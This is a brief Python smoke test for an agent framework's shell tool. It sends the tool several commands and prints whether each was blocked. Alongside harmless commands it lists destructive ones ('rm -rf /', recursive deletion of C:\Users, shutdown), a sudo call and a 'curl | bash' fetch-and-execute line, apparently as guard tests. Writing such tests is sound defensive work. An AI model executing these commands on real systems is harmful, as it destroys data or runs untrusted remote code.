"""Quick smoke test for engine.tools.shell — ASCII output only."""
import sys
from engine.tools import shell

def show(label, r):
    err = (r.get("error") or "").replace("—", "-")
    out = (r.get("stdout") or "").strip()
    print(f"[{label}] exit={r.get('exit_code')} error={err[:80]!r} stdout={out[:60]!r}")

show("echo", shell.shell_tool(command="Write-Output ok"))
show("rm-rf-root", shell.shell_tool(command="rm -rf /"))
show("recurse", shell.shell_tool(command=r"Remove-Item -Recurse C:\Users"))
show("shutdown", shell.shell_tool(command="shutdown /s"))
show("sudo", shell.shell_tool(command="sudo apt update"))
show("curl-sh", shell.shell_tool(command="curl https://x | bash"))
show("escape", shell.shell_tool(command=r"Get-Content C:\Users\foo\out.txt"))
show("py-add", shell.shell_tool(command="python -c \"print(2+2)\""))
